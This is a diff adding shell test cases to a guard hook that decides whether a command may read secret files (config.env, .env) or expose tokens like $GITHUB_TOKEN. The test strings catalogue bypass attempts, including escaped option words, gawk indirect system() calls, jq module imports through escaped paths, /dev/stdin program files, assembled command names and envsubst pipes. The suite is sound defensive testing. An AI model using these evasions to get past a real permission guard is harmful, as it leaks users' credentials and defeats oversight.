+expect_in "$GA" DENY  "gawk's indirect call keeps its regex a glob" "gawk 'BEGIN{f=\"system\"; @f(\"ls\")} /x.*/' f"
+expect_in "$GA" DENY  "an indirect call by a built-up name keeps a glob" \
+    "gawk 'BEGIN{f=\"s\" \"ystem\"; @f(\"ls\")} /x.*/' f"
+expect      ALLOW "mawk with a regex address"                     "mawk '/^a.*b/ {print}' f"
+expect_in "$GS" ALLOW "a sed named as an operand starts no sed walk" "grep -n sed 'sub/*'"
+
+# Operand roles: grep, rg, git grep, gh. A pattern or an option's value is not a file the tool reads; every file
+# operand is still screened, and a walked tool that is not the stage's first command word keeps today's reading.
+expect ALLOW "grep -e of a secret-shaped pattern allowed"            'grep -e config.env f'
+expect ALLOW "grep's first operand is its pattern"                   "grep -n 'process\.env' f"
+expect ALLOW "grep --regexp= of a secret-shaped pattern allowed"     'grep --regexp=config.env f'
+expect ALLOW "grep -e glued to its pattern allowed"                  'grep -econfig.env f'
+expect ALLOW "a reader-named pattern adds no reader"                 'grep -e cat -e config.env f'
+expect ALLOW "a shell-named pattern starts no shell"                 'grep -rn bash -c f'
+expect ALLOW "grep --colour is a known flag"                         'grep --colour -e config.env f'
+expect ALLOW "rg -e of a secret-shaped pattern allowed"              'rg -e config.env f'
+expect ALLOW "rg's first operand is its pattern"                     "rg 'x\.env' f"
+expect ALLOW "git grep's pattern allowed"                            'git grep -n config.env'
+expect ALLOW "gh --jq of a key filter allowed"                       "gh pr view 1 --jq '.[]|.key'"
+expect DENY  "a quoted variable as a piped pattern is denied"        "grep '\$API_TOKEN' f | head"
+expect DENY  "a pattern word read as a file by cat denied"           'cat grep config.env'
+expect DENY  "grep -f names a file"                                  'grep -f config.env x'
+expect DENY  "grep --file names a file"                              'grep --file config.env x'
+expect DENY  "grep --exclude-from= names a file"                     'grep --exclude-from=config.env x .'
+expect DENY  "an operand after -e is a file"                         'grep -e x config.env'
+expect DENY  "a second operand is a file"                            'grep x config.env'
+expect DENY  "an unknown bare option voids the pattern reading"      'grep --frobnicate -e config.env -e x f'
+expect DENY  "an abbreviated option voids the pattern reading"       'grep --reg config.env f'
+expect DENY  "rg --pre names a program"                              'rg --pre cat -e config.env f'
+expect DENY  "a wrapper's option value is no command position"       'sudo -u grep cat -e config.env'
+expect DENY  "a wrapped grep keeps today's reading"                  'time grep -e config.env f'
+expect DENY  "an xargs replacement string is no command position"    'xargs -I grep cat -e config.env'
+expect DENY  "a pattern word piped to xargs cat is still screened"   'grep -e config.env f | xargs cat'
+expect DENY  "a wrapper's value names gh, not the command"           'sudo -u gh pr config.env'
+expect DENY  "a GREP_OPTIONS assignment voids the pattern reading"   'GREP_OPTIONS=-f grep config.env x'
+expect DENY  "sed's operand is a file"                               'sed -n p config.env'
+expect DENY  "sed's r command reads a file"                          "sed 'r config.env' f"
+expect DENY  "awk -f names a program file"                           'awk -f config.env x'
+expect DENY  "awk's getline reads a file a -v value names"           "awk -v f=config.env '{getline l < f; print l}' x"
+expect ALLOW "grep's pattern with a recursive root allowed"          'grep -rn config.env .'
+expect DENY  "an assignment before grep voids the pattern reading"   'FOO=1 grep -e config.env f'
+expect DENY  "POSIXLY_CORRECT changes grep's option parsing"         'POSIXLY_CORRECT=1 grep config.env f'
+expect DENY  "an assignment before jq voids the filter reading"      "FOO=1 jq '.key' f.json"
+expect ALLOW "git grep -e with a pathspec allowed"                   'git grep -e config.env -- f'
+expect ALLOW "an option value in gh's subcommand slot allowed"       'gh -R cat pr list --jq .key'
+expect DENY  "a second reader-named operand keeps the deny"          'grep -e config.env f cat'
+expect DENY  "git grep -e leaves the first operand a file"           'git grep -e x config.env'
+expect DENY  "a git grep pathspec is a file"                         'git grep -n -- config.env'
+expect DENY  "rg --files takes no pattern"                           'rg --files config.env'
+expect DENY  "rg --ignore-file names a file"                         'rg --ignore-file=config.env x f'
+expect DENY  "an input redirection is a file"                        'grep -e config.env f < config.env'
+expect DENY  "gh's subcommand slot taken, a later reader keeps the deny" 'gh config.env pr'
+expect DENY  "a second git reader name keeps the deny"               'grep -e config.env f git log'
+# A glob the shell expands is a list of file names, not a pattern, wherever the tool takes a pattern.
+expect ALLOW "a quoted glob in the pattern slot is text"             "grep '*env' f"
+expect DENY  "an unquoted glob in the pattern slot expands"          'grep *env f'
+expect DENY  "an unquoted glob after -e expands"                     'grep -e *env f'
+expect DENY  "an unquoted glob after --regexp= expands"              'grep --regexp=*env f'
+expect DENY  "an unquoted glob glued to -A expands"                  'grep -A*env f'
+expect DENY  "an unquoted bracket glob after -e expands"             'grep -e [ac]*env f'
+expect DENY  "an unquoted brace word after -e expands"               'grep -e {a,config}.env f'
+expect DENY  "an unquoted glob after rg -e expands"                  'rg -e *env f'
+# A word the shell may expand or split can add an option, so no operand's role is known: -m $X may be -m 5 -f.
+expect DENY  "an unquoted variable may split into an option"         'grep -m $X config.env f'
+expect DENY  "a brace word may expand into an option"                'grep -m {5,-f} config.env f'
+expect DENY  "an unquoted glob may expand into an option"            'grep -m * config.env f'
+expect DENY  "an option word with a brace expands"                   'grep -e{,} config.env f'
+expect DENY  "a brace word in the option slot expands"               'grep {-e,-x} config.env f'
+expect ALLOW "a quoted variable after -m is text"                    "grep -m '\$X' config.env f"
+expect ALLOW "a quoted glob after -m is text"                        "grep -m '5*' config.env f"
+expect DENY  "a GREP_ assignment voids the pattern reading"          'GREP_COLORS=x grep -e config.env f'
+expect DENY  "a RIPGREP_ assignment voids the pattern reading"       'RIPGREP_CONFIG_PATH=x rg -e config.env f'
+expect DENY  "a quoted GREP_ assignment name voids the reading"      'GREP_OPT""IONS=-f grep config.env x'
+expect DENY  "a quoted RIPGREP_ assignment name voids the reading"   'RIPGREP_CONFIG_"PATH"=x rg -e config.env f'
+
+# Operand roles: jq. The filter and an --arg name or value are text; every input file, program file and --rawfile or
+# --slurpfile file is still read.
+expect ALLOW "a jq filter ending in .key allowed"                    "jq 'to_entries[]|.key' f.json"
+expect ALLOW "a jq filter ending in .env allowed"                    "jq '.x.env' f.json"
+expect ALLOW "jq --arg values allowed"                               "jq --arg k .env '.' f.json"
+expect ALLOW "jq --rawfile's name allowed"                           'jq --rawfile config.env x.json .'
+expect ALLOW "a jq filter after bundled options allowed"             "jq -nr '.key' f.json"
+expect DENY  "jq of a secret input denied"                           'jq . config.env'
+expect DENY  "jq --rawfile's file denied"                            'jq --rawfile v config.env .'
+expect DENY  "jq --slurpfile's file denied"                          'jq --slurpfile v config.env .'
+expect DENY  "jq -f names a program file"                            'jq -f config.env x.json'
+expect DENY  "jq --from-file names a program file"                   'jq --from-file config.env x.json'
+expect DENY  "a filter that imports a file is screened"              "jq -n 'import \"./secrets/app\" as \$d; \$d'"
+expect DENY  "a filter that loads a module through modulemeta is screened" "jq -n '\"./secrets/app\" | modulemeta'"
+expect DENY  "modulemeta of a computed module name is denied"        "jq -n '\"./sec\" + \"rets/app\" | modulemeta'"
+expect DENY  "an import path written with an escape is denied" \
+    "jq -n 'import \"./\\u0073ecrets/app\" as \$d; \$d'"
+expect DENY  "an include path written with an escape is denied"      "jq -n 'include \"./\\u0073ecrets/app\"; .'"
+expect DENY  "a module-loading filter after an unknown option is denied" \
+    "jq --frob x 'import \"./\\u0073ecrets/app\" as \$d; \$d'"
+expect DENY  "modulemeta through sudo jq is denied" \
+    "sudo jq -n '\"./sec\" + \"rets/app\" | modulemeta'"
+expect DENY  "modulemeta through env jq is denied"                   "env jq -n '\"./sec\" + \"rets/app\" | modulemeta'"
+expect DENY  "modulemeta through command jq is denied" \
+    "command jq -n '\"./sec\" + \"rets/app\" | modulemeta'"
+expect DENY  "modulemeta through xargs jq is denied" \
+    "xargs jq -n '\"./sec\" + \"rets/app\" | modulemeta'"
+expect DENY  "an escaped import through nice jq is denied" \
+    "nice jq -n 'import \"./\\u0073ecrets/app\" as \$d; \$d'"
+expect DENY  "modulemeta as an --arg value is denied"                "jq -n --arg k modulemeta '.'"
+expect DENY  "an import with a search path in its metadata is denied" \
+    "jq -n 'import \"app\" as \$d {search: \"./secrets\"}; \$d'"
+expect DENY  "an include with a search path in its metadata is denied" \
+    "jq -n 'include \"app\" {search: \"./secrets\"}; .'"
+expect DENY  "a double-quoted import path with a live variable is denied" 'jq -n "import \"./$P/app\" as x; x"'
+expect ALLOW "a plain import in single quotes is text"               "jq -n 'import \"lib\" as \$d; \$d'"
+expect DENY  "jq -f /dev/stdin reads an unseen program"              'jq -f /dev/stdin x.json'
+expect DENY  "jq -f - reads an unseen program"                       'jq -f - x.json'
+expect DENY  "jq --from-file /dev/fd/3 reads an unseen program"      'jq --from-file /dev/fd/3 x.json'
+expect DENY  "jq -f with doubled slashes reads an unseen program"    'jq -f //dev/stdin x.json'
+expect DENY  "jq -f of a /proc descriptor reads an unseen program"   'jq -f /proc/self/fd/0 x.json'
+expect DENY  "jq -f of a /dev path with a dot segment is denied"     'jq -f /dev/./fd/3 x.json'
+expect DENY  "jq -f of a path with a .. segment is denied"           'jq -f ../../dev/stdin x.json'
+expect DENY  "jq -f with a dot segment before /dev is denied"        'jq -f /./dev/stdin x.json'
+expect DENY  "jq -f with a glob in the program path is denied"       'jq -f /de?/stdin x.json'
+expect DENY  "jq -f with a live variable as the program is denied"   'jq -f $P x.json'
+expect DENY  "jq -f with a quoted space in the program path is denied" "jq -f 'a b.jq' x.json"
+expect DENY  "jq -f after --args reads the same program operand"     'jq --args -f /dev/stdin x.json'
+expect ALLOW "jq -f of a script file with output to /dev/null"       'jq -f prog.jq x.json > /dev/null'
+expect ALLOW "jq -f of a script file in a subdirectory"              'jq -f ./lib/prog.jq x.json'
+expect DENY  "jq -f with a /DEV path in any case is denied"          'jq -f /DEV/stdin x.json'
+expect DENY  "jq -f with a /Proc path in any case is denied"         'jq -f /Proc/self/fd/0 x.json'
+expect DENY  "the path may follow -f's other operands"               'jq x.json -f /dev/stdin'
+# Known false denies: with -f every operand is screened, since the hook does not tell the program from the data.
+expect DENY  "known false deny: a parent-directory input beside jq -f" 'jq -f prog.jq ../data.json'
+expect DENY  "known false deny: a standard-input operand beside jq -f" 'jq -f prog.jq -'
+expect DENY  "known false deny: the same input beside a wrapped jq -f" 'sudo jq -f prog.jq ../data.json'
+expect DENY  "jq -L's attached directory voids the filter reading"   "jq -Lconfig.env '.key' f.json"
+expect DENY  "jq -nL's directory is a file"                          'jq -nL config.env . f.json'
+expect ALLOW "jq --indent's value allowed"                          "jq --indent 2 '.key' f.json"
+expect ALLOW "jq --argjson's name and value allowed"                 "jq --argjson k 1 '.key' f.json"
+expect ALLOW "jq --slurpfile of a plain data file allowed"           "jq --slurpfile v data.json '.key' f.json"
+expect ALLOW "jq --tab is a known flag"                              "jq --tab '.key' f.json"
+expect DENY  "an -L bundle with attached text voids the filter reading" "jq -Ln '.key' f.json"
+expect ALLOW "an -L that ends the bundle takes the next word"        "jq -nL lib '.key' f.json"
+expect DENY  "a bundled -nf with standard input reads an unseen program" 'jq -nf /dev/stdin x.json'
+expect DENY  "sudo jq -f /dev/stdin reads an unseen program"         'sudo jq -f /dev/stdin x.json'
+expect ALLOW "jq -f of a script file keeps its trust"                'jq -f prog.jq x.json'
+expect DENY  "jq --argfile's file denied"                           'jq --argfile v config.env .'
+expect ALLOW "jq --argfile's name allowed"                           'jq --argfile config.env x.json .'
+expect ALLOW "a jq field named include is text"                      "jq '.include' f.json"
+expect ALLOW "a jq field named import is text"                       "jq 'select(.import)' f.json"
+expect DENY  "every word after --args is screened"                   "jq --args '.x' config.env"
+expect DENY  "the filter after --args is screened too"               "jq --args '.key' a"
+expect DENY  "a later jq operand is an input file"                   "jq '.a' f.json config.env"
+expect DENY  "an unknown jq option voids the filter reading"         "jq --frob '.key' f.json"
+expect DENY  "a wrapped jq keeps today's reading"                    "sudo jq '.key' f.json"
+expect DENY  "a quoted variable in a piped jq --arg is denied"       "jq -n --arg k '\$GITHUB_TOKEN' '\$k' | envsubst"
+expect DENY  "an unquoted glob in a jq --arg slot expands"           'jq -n --arg k *env .'
+expect DENY  "an unquoted glob as the jq filter expands"             'jq *env f.json'
+expect DENY  "jq -L names a directory"                               'jq -L config.env . f.json'
+expect DENY  "an unknown short jq option voids the filter reading"   "jq -Z '.key' f.json"
+expect DENY  "jq after -- takes the first operand as the filter only" "jq -- . config.env"
+# A word the shell may split can add an option of its own: --arg k $V '.key' may read .key as the program of a -f.
+expect DENY  "an unquoted variable in a jq --arg slot may split"      "jq --arg k \$V '.key' f.json"
+expect ALLOW "a quoted variable in a jq --arg slot is text"           "jq --arg k '\$V' '.key' f.json"
+
+# Operand roles: git log, show, diff. A pickaxe, grep, author or date value and a --format text are not files; a
+# pathspec, a revision, the file of -L and every operand after -- are.
+expect ALLOW "git log -S of a secret-shaped string allowed"           'git log -S config.env'
+expect ALLOW "git log -p -S allowed"                                  'git log -p -S config.env'
+expect ALLOW "git log -S glued allowed"                               'git log -Sconfig.env'
+expect ALLOW "git log -G of a pattern allowed"                        "git log -G 'x\\.env'"
+expect ALLOW "git log --grep allowed"                                 'git log --grep config.env'
+expect ALLOW "git log --grep= allowed"                                'git log --grep=config.env'
+expect ALLOW "git log --author allowed"                               'git log --author config.env'
+expect ALLOW "git log --format= text allowed"                         "git log --format='%H .env'"
+expect ALLOW "git show -S allowed"                                    'git show -S config.env HEAD'
+expect ALLOW "git diff -S allowed"                                    'git diff -S config.env'
+expect DENY  "a pathspec after -- denied"                             'git log -p -- config.env'
+expect DENY  "git log -L's file is read"                              'git log -L 1,2:config.env'
+expect DENY  "--format takes no separate value"                       'git log --format config.env'
+expect DENY  "an unknown bare option voids the value reading"         'git log --anchored -S config.env -p'
+expect DENY  "git show of a blob denied"                              'git show HEAD:config.env'
+expect DENY  "a wrapped git keeps today's reading"                    'sudo git log -S config.env'
+expect DENY  "a quoted variable in a piped git --format is denied"    "git log -1 --format='\$GITHUB_TOKEN' | envsubst"
+expect ALLOW "git log -n takes a count and -S its value"              'git log -n 5 -S config.env'
+expect ALLOW "git log options before the value"                       'git log --oneline -3 -S config.env'
+expect ALLOW "git -C names the repository before log"                 'git -C . log -S config.env'
+expect ALLOW "git log --since takes a separate date"                  'git log --since config.env --until=x'
+expect ALLOW "git log --pretty= text allowed"                         "git log --pretty=format:'%h config.env' -n3"
+expect ALLOW "a quoted glob in the -S slot is text"                   "git log -S '*env'"
+expect ALLOW "a pathspec after -- of a benign name allowed"           'git log -S config.env -- src'
+expect ALLOW "a revision named like a reader is no reader"            'git log HEAD -S config.env'
+expect ALLOW "a pathspec named like a reader after -- is no reader"   'git log -S config.env -- cat'
+expect DENY  "a bare word before -- is a revision or path"            'git log -S x config.env'
+expect DENY  "a second -S value does not hide a later operand"        'git log -S config.env config.env'
+expect DENY  "an unquoted glob in the -S slot expands"                'git log -S *env'
+expect DENY  "an unquoted variable may split into an option"          'git log -S $X config.env'
+expect DENY  "an unquoted brace in the -S slot expands"               'git log -S {a,config}.env'
+expect DENY  "an unquoted variable before -S may split into --"       'git log -n $X -S config.env'
+expect ALLOW "a quoted variable before -S is text"                    "git log -n '\$X' -S config.env"
+expect DENY  "an assignment before git voids the value reading"       'FOO=1 git log -S config.env'
+expect DENY  "an assignment before git voids the glued reading"       'GIT_PAGER=cat git log -Sconfig.env'
+expect DENY  "an unknown short option voids the value reading"        'git log -X -S config.env'
+expect DENY  "a bundled short option voids the value reading"         'git log -pS config.env'
+expect DENY  "git diff of a pathspec after -- denied"                 'git diff -S x -- config.env'
+expect DENY  "git diff --no-index operands are read"                  'git diff --no-index -S x config.env y'
+expect DENY  "git show of a bare path is read"                        'git show -S x config.env'
+expect DENY  "a second git word does not give roles to a later reader" 'git log -S x git show config.env'
+expect DENY  "after -- an -S is a pathspec"                           'git log -- -S config.env'
+expect ALLOW "git log --author= text allowed"                         'git log --author=config.env'
+expect ALLOW "git log --until takes a separate date"                  'git log --until config.env'
+expect ALLOW "git log -n glued to a count text allowed"               'git log -nconfig.env'
+
+# Metadata-only git diff: a diff whose options leave names and counts only (--stat, --name-only) may name a secret path,
+# as it prints none of the file; any option that may print contents, or the walk does not know, keeps the reader.
+expect ALLOW "git diff --stat of a secret path allowed"               'git diff --stat -- config.env'
+expect ALLOW "git diff --cached --name-only allowed"                  'git diff --cached --name-only -- config.env'
+expect ALLOW "git diff --numstat of a revision allowed"               'git diff --numstat HEAD~1 -- config.env'
+expect ALLOW "git diff --name-status -M allowed"                      'git diff --name-status -M -- config.env'
+expect ALLOW "git diff --stat= allowed"                               'git diff --stat=80 -- config.env'
+expect ALLOW "git diff -s --exit-code allowed"                        'git diff -s --exit-code -- config.env'
+expect ALLOW "git -C names the repository before a names-only diff"   'git -C . diff --stat -- config.env'
+expect ALLOW "an option after -- is a pathspec, not a patch flag"     'git diff --stat -- config.env -p'
+expect ALLOW "a quoted variable beside --stat is text"                "git diff --stat '\$X' -- config.env"
+expect DENY  "git diff of a secret path denied"                       'git diff -- config.env'
+expect DENY  "git diff --cached of a secret path denied"              'git diff --cached -- config.env'
+expect DENY  "a patch flag beside --stat denied"                      'git diff --stat -p -- config.env'
+expect DENY  "--patch-with-stat denied"                               'git diff --patch-with-stat -- config.env'
+expect DENY  "an unknown option beside --name-only denied"            'git diff --name-only --frob -- config.env'
+expect DENY  "--no-index beside --stat denied"                        'git diff --stat --no-index config.env x'
+expect DENY  "a full diff after xargs denied"                         'echo config.env | xargs git diff --'
+expect DENY  "a wrapped names-only diff keeps today's reader"         'echo config.env | xargs git diff --stat --'
+expect DENY  "git log --stat keeps its reader"                        'git log --stat -- config.env'
+expect DENY  "git show --stat of a blob denied"                       'git show --stat HEAD:config.env'
+expect DENY  "a names-only option after -- is a pathspec"             'git diff -- config.env --stat'
+expect DENY  "a context option beside --stat denied"                  'git diff --stat -U5 -- config.env'
+expect DENY  "a pickaxe option beside --stat denied"                  'git diff --stat -S x -- config.env'
+expect DENY  "--exit-code alone still prints the diff"                'git diff --exit-code -- config.env'
+expect DENY  "an assignment before git keeps the reader"              'FOO=1 git diff --stat -- config.env'
+expect DENY  "an unquoted variable beside --stat may split into -p"   'git diff --stat $X -- config.env'
+expect DENY  "an unquoted glob beside --stat expands"                 'git diff --stat -- *env'
+expect DENY  "a wrapped git diff --stat keeps today's reader"         'sudo git diff --stat -- config.env'
+expect DENY  "a secret-shaped variable beside --stat is still denied" "git diff --stat \"\$GITHUB_TOKEN\""
+expect DENY  "a hex-escaped -p beside --stat denied"                  "git diff --stat \$'\\x2dp' -- config.env"
+expect DENY  "an octal-escaped -p beside --stat denied"               "git diff --stat \$'\\055p' -- config.env"
+expect DENY  "a hex-escaped --no-index beside --stat denied" \
+    "git diff --stat \$'\\x2d\\x2dno-index' config.env x"
+expect DENY  "a unicode-escaped -p beside --stat denied"              "git diff --stat \$'\\u002dp' -- config.env"
+expect ALLOW "an escaped word after -- is a pathspec"                 "git diff --stat -- config.env \$'\\x2dp'"
+expect DENY  "a secret-shaped variable before the subcommand is still denied" 'git -C $GITHUB_TOKEN diff --stat'
+expect DENY  "a literal secret-shaped variable piped on is still denied" "git diff --stat '\$GITHUB_TOKEN' | envsubst"
+expect DENY  "a names-only diff does not let xargs read what it names" 'git diff --name-only -- config.env | xargs cat'
+
+# Escaped words in role walks: a $'...' escape stays as written in the word (\x2d for -), so a walk that reads a word's
+# text would take an escaped option or -- for a value or a pathspec; such a word voids the stage's roles.
+expect DENY  "a hex-escaped -- makes -S a pathspec of git log"        "git log -p \$'\\x2d\\x2d' -S config.env"
+expect DENY  "a hex-escaped -- makes -n a pathspec of git log"        "git log -p \$'\\x2d\\x2d' -n config.env"
+expect DENY  "git show of a pathspec after a hex-escaped -- denied"   "git show \$'\\x2d\\x2d' config.env"
+expect DENY  "an octal-escaped -- makes -S a pathspec of git log"     "git log -p \$'\\055\\055' -S config.env"
+expect DENY  "a long-unicode-escaped -- makes -S a pathspec" \
+    "git log -p \$'\\U0000002d\\U0000002d' -S config.env"
+expect DENY  "a -- made of two escaped halves makes -S a pathspec"    "git log -p \$'\\x2d'\$'\\x2d' -S config.env"
+expect DENY  "an escaped option of git log voids the value reading"   "git log \$'\\x2dp' -S config.env"
+expect DENY  "an escaped pathspec after -- is still a read"           "git log -p -- \$'\\x2d\\x2d' config.env"
+expect ALLOW "an escaped word after -- leaves the earlier text roles" "git log -S config.env -- \$'\\x2dp'"
+expect ALLOW "an escape that is no option leaves git log's roles"     "git log -p \$'\\cm' -S config.env"
+expect DENY  "a hex-escaped --file= names a grep pattern file"        "grep \$'\\x2d\\x2dfile=config.env' x"
+expect DENY  "an octal-escaped --file= names a grep pattern file"     "grep \$'\\055\\055file=config.env' x"
+expect DENY  "a long-unicode-escaped --file= names a grep pattern file" \
+    "grep \$'\\U0000002d\\U0000002dfile=config.env' x"
+expect DENY  "a hex-escaped --file= names an rg pattern file"         "rg \$'\\x2d\\x2dfile=config.env' x"
+expect DENY  "a hex-escaped -f glued to a file names an rg pattern file" "rg \$'\\x2dfconfig.env' x"
+expect DENY  "a hex-escaped -f takes the next word as a pattern file" "grep \$'\\x2df' config.env x"
+expect DENY  "an escaped f inside a grep bundle takes a pattern file" "grep -i\$'\\x66' config.env x"
+expect DENY  "an escaped f inside an rg bundle takes a pattern file"  "rg -i\$'\\x66' config.env x"
+expect DENY  "a lone escaped f after - takes a pattern file"          "grep -\$'\\x66' config.env x"
+expect DENY  "an octal-escaped f in a long option name takes a pattern file" "grep --\$'\\146'ile=config.env x"
+expect_in "$T" DENY "a hex-escaped --file= names a git grep pattern file" "git grep \$'\\x2d\\x2dfile=config.env' x"
+expect ALLOW "a backslash that is no numeric escape leaves grep's roles" "grep 'config\\.env' x"
+expect ALLOW "a glued grep -e pattern with a backslash keeps its roles" "grep -e'\\.env' x"
+expect ALLOW "a glued rg -g glob with a backslash keeps its roles"      "rg -g'!*\\.env' KEY x"
+expect ALLOW "a grep --regexp= pattern with a backslash keeps its roles" "grep --regexp='\\.env' x"
+expect DENY  "a hex-escaped -f makes the first jq word a program file" "jq config.env \$'\\x2df'"
+expect DENY  "a hex-escaped --from-file makes the first jq word a program file" \
+    "jq config.env \$'\\x2d\\x2dfrom-file'"
+expect DENY  "an escaped f after --args makes the first jq word a program file" "jq config.env --args -\$'\\x66'"
+expect DENY  "a hex-escaped --rawfile reads the file after its name"  "jq -n \$'\\x2d\\x2drawfile' v config.env '\$v'"
+expect DENY  "a hex-escaped --slurpfile reads the file after its name" \
+    "jq -n \$'\\x2d\\x2dslurpfile' v config.env '\$v'"
+expect ALLOW "a jq interpolation holds a backslash and keeps its roles" "jq '\"\\(.config.env)\"' x.json"
+# An escape led by an empty quoted part, or written in $"…", stays as written like a bare $'…' one.
+expect DENY  "an empty single-quoted part before an escaped -- makes -S a pathspec" \
+    "git log -p ''\$'\\x2d\\x2d' -S config.env"
+expect DENY  "an empty double-quoted part before an escaped -f is an unknown option of git log" \
+    "git log -p \"\"\$'\\x2df' -S config.env"
+expect DENY  "a locale-quoted escaped -- is an unknown word of git log" 'git log -p $"\x2d\x2d" -S config.env'
+expect DENY  "an empty part before an escaped -- makes a pathspec of git show" "git show ''\$'\\x2d\\x2d' config.env"
+expect DENY  "an empty part before an escaped --file= names a grep pattern file" \
+    "grep ''\$'\\x2d\\x2dfile=config.env' x"
+expect DENY  "an empty double-quoted part before an escaped -f names a grep pattern file" \
+    "grep \"\"\$'\\x2df' config.env x"
+expect DENY  "a locale-quoted escaped --file= is an unknown grep word" 'grep $"\x2d\x2dfile=config.env" x'
+expect DENY  "an empty part before an escaped -f makes the first jq word a program file" \
+    "jq config.env ''\$'\\x2df'"
+expect DENY  "a locale-quoted escaped -f is an unknown jq word" 'jq config.env $"\x2df"'
+# Edges of the variant gate: a glob ending in a slash has an empty last component and skips the variant test; an =
+# form with a glob value runs it.
+GV="$pt/gatev"
+mkdir -p "$GV/d1x"
+: >"$GV/d1x/.env"
+expect_in "$GV" ALLOW "a glob ending in a slash names directories and reads no file" 'cat d1*/'
+expect_in "$GV" DENY  "a glob directory with a secret glob below it is denied"       'cat d1*/.en*'
+expect_in "$GV" DENY  "an = form whose value globs a secret name is denied"          'cat --file=.en*'
+expect_in "$GV" DENY  "an assignment form whose value globs a secret name is denied" 'cat x=.en*'
+
+# Assembled command words: the guard knows a tool and git's subcommand by their text, so a name the shell may assemble
+# (a variable, brace or glob in it, or an escape that stays as written) is held, as is a global option of git's that
+# does. $GR holds a .env in HEAD and none in HEAD~1; $P a .env in its root and none under src.
+expect_in "$GR" ASK   "a variable before git's subcommand asks, with a revision"      'git ${X}grep -n x HEAD~0'
+expect_in "$GR" ASK   "a variable inside git's subcommand asks, with a revision"      'git g${X}rep -n x HEAD~0'
+expect_in "$GR" ASK   "a variable before git's subcommand asks, with no revision"     'git ${X}grep -n x'
+expect_in "$GR" ASK   "a variable before git's subcommand asks, with a pathspec"      'git ${X}grep -n x -- docs'
+expect_in "$GR" ASK   "a double-quoted variable in git's subcommand asks"             'git "${X}grep" -n x'
+expect_in "$GR" ASK   "a brace in git's subcommand asks"                              'git g{r,r}ep -n x'
+expect_in "$GR" ASK   "a glob in git's subcommand asks"                               'git g*ep -n x'
+expect_in "$GR" ASK   "a bracket in git's subcommand asks"                            'git g[r]ep -n x'
+expect_in "$GR" ASK   "an escape kept as written in git's subcommand asks"            "git \$'g\\x72ep' -n x"
+expect_in "$GR" ASK   "a variable before a global option of git asks"                 'git ${X}--no-pager grep -n x'
+expect_in "$GR" ASK   "a variable inside a global option of git asks"                 'git -${X}C docs grep -n x'
+expect_in "$GR" ASK   "a variable in git's subcommand asks behind a -C"               'git -C docs ${X}grep -n x'
+expect_in "$GR" ASK   "a variable as git's subcommand asks"                           'git $X -n x HEAD~0'
+expect_in "$GR" ASK   "a variable in git's subcommand asks behind a wrapper"          'sudo git ${X}grep -n x'
+expect_in "$GR" ASK   "a variable inside git asks"                                    'g${X}it grep -n x'
+expect_in "$GR" ASK   "a variable inside a git path asks"                             '/usr/bin/g${X}it grep -n x'
+expect_in "$GR" ASK   "a variable inside a dashed git command asks"                   'git-g${X}rep -n x'
+expect_in "$GR" ASK   "a hex escape inside git asks"                                  "\$'g\\x69t' grep -n x"
+expect_in "$GR" ASK   "a variable as the command word asks"                           '$X grep -n x'
+expect_in "$GR" ASK   "a variable inside git asks behind an assignment"               'A=1 g${X}it grep -n x'
+expect_in "$GR" ASK   "a variable inside git asks behind env options"                 'env -i g${X}it grep -n x'
+expect_in "$GR" ASK   "a variable inside git asks behind command"                     'command g${X}it grep -n x'
+expect_in "$GR" ASK   "a variable inside git asks behind time"                        'time g${X}it grep -n x'
+expect_in "$GR" DENY  "env with no option still denies a command it cannot screen"    'env g${X}it grep -n x'
+expect_in "$P" ASK    "a variable inside grep asks, recursive"                        'g${X}rep -rn x .'
+expect_in "$P" ASK    "a variable inside rg asks"                                     'r${X}g x'
+expect_in "$P" ASK    "a glob inside grep asks"                                       'gr*p -rn x .'
+expect_in "$GR" ALLOW "a clean revision of a literal subcommand stays allowed"        'git grep -n x HEAD~1'
+expect_in "$GR" ALLOW "a quoted subcommand stays allowed"                             'git "grep" -n x HEAD~1'
+expect_in "$GR" ALLOW "a single-quoted dollar in git's subcommand is text"            "git '\${X}grep' -n x HEAD~1"
+expect_in "$GR" ALLOW "a quoted glob in git's subcommand is text"                     "git 'g*ep' -n x HEAD~1"
+expect_in "$GR" ALLOW "an ANSI-C quoted literal subcommand stays allowed"             "git \$'grep' -n x HEAD~1"
+expect_in "$GR" ALLOW "a variable in the value of a global option of git stays allowed" \
+    'git --git-dir=$X/.git log -1 --format=%h'
+expect_in "$P" ALLOW  "a recursive grep of a clean directory stays allowed"           'grep -rn x src/'
+expect_in "$P" ALLOW  "a bracket command stays allowed"                               '[ -f src/a.py ] && ls src'
+expect_in "$P" ALLOW  "a double-bracket command stays allowed"                        '[[ -f src/a.py ]] && ls src'
+expect_in "$P" ALLOW  "echo of a variable stays allowed"                              'echo ${X}'
+expect_in "$P" ALLOW  "a variable in an assignment before a command stays allowed"    'A=$X ls src'
+expect_in "$P" ASK    "a variable in the directory part of the command word asks"     '$HOME/bin/tool src'
+expect_in "$P" ASK    "an assembled directory part of the command word asks"          '/usr/${X}bin/cat src/a.py'
+expect_in "$P" DENY   "a brace in the directory part builds the program and its secret file" "/{bin/cat,$P/.env} f"
+expect_in "$P" ASK    "a brace in the directory part builds the program"              '/{bin/cat,x/y} f'
+expect_in "$GR" ASK   "a brace around the whole command word asks"                    '{/usr/bin/git,x} grep -n x'
+expect_in "$GR" ASK   "a glob in the directory part of the command word asks"         '/usr/b*n/git grep -n x HEAD~1'
+expect_in "$GR" ALLOW "a literal path to git stays allowed"                           '/usr/bin/git grep -n x HEAD~1'
+# Any word of a wrapper's stage may be the command it runs, since the hook does not tell a wrapper's option values and
+# operands from it: one the shell may assemble asks.
+expect_in "$GR" ASK   "a variable inside git asks behind sudo"                        'sudo g${X}it grep -n x'
+expect_in "$GR" ASK   "a variable in git's subcommand asks behind nice and an option"  'nice -n 5 git ${X}grep -n x'
+expect_in "$P" ASK    "a variable inside grep asks behind timeout"                    'timeout 5 g${X}rep -rn x .'
+expect_in "$GR" ASK   "a variable inside git asks behind xargs"                       'xargs g${X}it grep -n x'
+expect_in "$GR" ASK   "a variable inside git asks behind doas"                        'doas g${X}it grep -n x'
+expect_in "$GR" ASK   "a variable inside git asks behind stdbuf"                      'stdbuf -oL g${X}it grep -n x'
+expect_in "$GR" ASK   "a variable inside git asks behind nohup"                       'nohup g${X}it grep -n x'
+expect_in "$P" ASK    "a variable as a wrapper's option value asks"                   'sudo -u $USER ls src'
+expect_in "$P" ASK    "a variable as a wrapper's operand asks"                        'timeout 5 make $TARGET'
+expect_in "$P" ASK    "a variable in a wrapped command's file name asks" \
